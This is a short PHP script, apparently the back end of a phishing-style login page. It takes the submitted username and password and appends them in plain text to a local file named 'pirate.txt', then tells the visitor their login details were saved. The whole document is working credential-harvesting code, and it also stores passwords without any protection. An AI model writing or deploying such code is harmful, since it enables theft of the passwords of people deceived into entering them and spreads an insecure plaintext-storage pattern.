<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the entered username and password from the form
        $username = $_POST["username"];
        $password = $_POST["password"];

        // Path to the file where you want to save the data (change accordingly)
        $file_path = "C:/pirate/pirate.txt";

        // Write the username and password to the file
        $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";
        if (file_put_contents($file_path, $data, FILE_APPEND)) {
            echo "<script>alert('Login details saved successfully.');</script>";
        } else {
            echo "<script>alert('Failed to save login details.');</script>";
        }
    }
    ?>